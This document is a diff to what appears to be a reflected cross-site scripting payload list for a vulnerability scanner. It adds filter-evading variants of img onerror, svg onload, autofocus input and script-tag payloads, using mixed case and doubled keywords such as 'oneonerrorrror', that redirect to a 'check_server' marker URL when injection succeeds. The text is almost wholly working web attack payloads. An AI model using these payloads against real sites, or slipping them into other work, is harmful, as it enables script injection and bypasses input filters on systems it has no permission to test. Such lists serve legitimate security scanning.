@@ -6,14 +6,16 @@
 <a hReF="http://check_server/Reflected_XSS_Success"></a>
 <a hrhrefef="http://check_server/Reflected_XSS_Success"></a>
 <a hRhReFeF="http://check_server/Reflected_XSS_Success"></a>
-<iMg sRc="#" onerror="location.href('http://check_server/Reflected_XSS_Success');">
-<img src="#" oNeRrOr="lOcAtIoN.hReF('http://check_server/Reflected_XSS_Success');">
-<img src="#" oneonerrorrror="location.href('http://check_server/Reflected_XSS_Success');">
-<iMg sRc="#" oNeOnErRoRrRoR="lOcAtIoN.hReF('http://check_server/Reflected_XSS_Success');">
+<img src="#" onerror="location.href('http://check_server/Reflected_XSS_Success');">
+<iimgmg ssrcrc="#" oneonerrorrror="localocationtion.hrhrefef('http://check_server/Reflected_XSS_Success');">
+<iMg sRc="#" oNeRrOr="lOcAtIoN.hReF('http://check_server/Reflected_XSS_Success');">
+<iImGmG sSrCrC="#" oNeOnErRoRrRoR="lOcAlOcAtIoNtIoN.hRhReFeF('http://check_server/Reflected_XSS_Success');">
 <svg src="#" onload=location.href="http://check_server/Reflected_XSS_Success">
 <sVg sRc="#" oNlOaD=lOcAtIoN.href="http://check_server/Reflected_XSS_Success">
+<ssvgvg ssrcrc="#" onlonloadoad=localocationtion.hrhrefef="http://check_server/Reflected_XSS_Success">
+<sSvGvG sSrCrC="#" oNlOnLoAdOaD=lOcAlOcAtIoNtIoN.hRhReFeF="http://check_server/Reflected_XSS_Success">
 <input type="text" id="xxs_scanning" onfocus="location.href='http://check_server/Reflected_XSS_Success'" autofocus>
-<iNpUt tYpE="text" iD="xxs_scanning" oNfOcUs="location.href='http://check_server/Reflected_XSS_Success'" aUtOfOcus>
+<iNpUt tYpE="text" iD="xxs_scanning" oNfOcUs="location.href='http://check_server/Reflected_XSS_Success'" aUtOfOcUs>
 <iframe srcdoc='<img src=about: onerror=parent.alert(document.domain)>'></iframe>
 <iFrAmE sRcDoC='<img src=about: onerror=parent.alert(document.domain)>'></iFrAmE>
 ><script>location.href="http://check_server/Reflected_XSS_Success"</script>
@@ -26,10 +28,12 @@
 ><a hRhReFeF="http://check_server/Reflected_XSS_Success"></a>
 ><img src="#" onerror="location.href('http://check_server/Reflected_XSS_Success');">
 ><img src="#" oNeRrOr="lOcAtIoN.hReF('http://check_server/Reflected_XSS_Success');">
-><img src="#" oneonerrorrror="location.href('http://check_server/Reflected_XSS_Success');">
-><img src="#" oNeOnErRoRrRoR="lOcAtIoN.hReF('http://check_server/Reflected_XSS_Success');">
+<iimgmg ssrcrc="#" oneonerrorrror="localocationtion.hrhrefef('http://check_server/Reflected_XSS_Success');">
+<iImGmG sSrCrC="#" oNeOnErRoRrRoR="lOcAlOcAtIoNtIoN.hRhReFeF('http://check_server/Reflected_XSS_Success');">
 ><svg src="#" onload=location.href="http://check_server/Reflected_XSS_Success">
 ><sVg sRc="#" oNlOaD=lOcAtIoN.hReF="http://check_server/Reflected_XSS_Success">
+<ssvgvg ssrcrc="#" onlonloadoad=localocationtion.hrhrefef="http://check_server/Reflected_XSS_Success">
+<sSvGvG sSrCrC="#" oNlOnLoAdOaD=lOcAlOcAtIoNtIoN.hRhReFeF="http://check_server/Reflected_XSS_Success">
 ><input type="text" id="xxs_scanning" onfocus="location.href='http://check_server/Reflected_XSS_Success'" autofocus>
 ><iNpUt tYpE="text" iD="xxs_scanning" oNfOcUs="location.href='http://check_server/Reflected_XSS_Success'" aUtOfOcus>
 ><iframe srcdoc='<img src=about: onerror=parent.alert(document.domain)>'></iframe>
